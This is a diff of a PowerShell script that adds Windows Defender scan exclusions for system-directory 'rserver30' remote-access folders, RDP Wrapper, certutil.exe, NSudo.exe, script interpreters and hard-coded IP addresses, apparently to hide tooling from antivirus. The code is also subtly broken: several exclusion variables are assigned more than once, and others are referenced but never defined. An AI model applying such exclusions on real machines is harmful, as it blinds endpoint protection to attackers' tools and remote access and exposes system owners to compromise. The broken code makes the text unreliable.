@@ -43,11 +43,20 @@ $aPathExclusion001="C:\ProgramData\NIT"
 $aPathExclusion002="C:\.BIN"
 $aPathExclusion003="C:\pub1"
 $aPathExclusion004="C:\Util"
+$aPathExclusion005="C:\Windows\System32\rserver30"
+$aPathExclusion005="C:\Windows\sysWOW64\rserver30"
+$aPathExclusion006="C:\tools"
+$aPathExclusion007="C:\Program Files\RDP Wrapper"
+$aPathExclusion008="C:\Python312"
 
 $aProcExclusion001="powershell.exe"
 $aProcExclusion002="RunsDownloaded.exe"
 $aProcExclusion003="cmd.exe"
 $aProcExclusion004="cscript.exe"
+$aProcExclusion005="python.exe"
+$aProcExclusion006="NSudo.exe"
+$aProcExclusion006="certutil.exe"
+$aProcExclusion006="perl.exe"
 
 $anIpExclusions001="88.147.147.107"
 $anIpExclusions002="93.189.41.9"
@@ -72,11 +81,19 @@ if( $isAdmin ){
 	Add-MpPreference -ExclusionPath $aPathExclusion002
 	Add-MpPreference -ExclusionPath $aPathExclusion003
 	Add-MpPreference -ExclusionPath $aPathExclusion004
+    Add-MpPreference -ExclusionPath $aPathExclusion005
+    Add-MpPreference -ExclusionPath $aPathExclusion006
+    Add-MpPreference -ExclusionPath $aPathExclusion007
+    Add-MpPreference -ExclusionPath $aPathExclusion008
 
 	Add-MpPreference -ExclusionProcess $aProcExclusion001
     Add-MpPreference -ExclusionProcess $aProcExclusion002
     Add-MpPreference -ExclusionProcess $aProcExclusion003
     Add-MpPreference -ExclusionProcess $aProcExclusion004
+    Add-MpPreference -ExclusionProcess $aProcExclusion005
+    Add-MpPreference -ExclusionProcess $aProcExclusion006
+    Add-MpPreference -ExclusionProcess $aProcExclusion007
+    Add-MpPreference -ExclusionProcess $aProcExclusion008
 
     Add-MpPreference -ExclusionIpAddress $anIpExclusions001
     Add-MpPreference -ExclusionIpAddress $anIpExclusions002
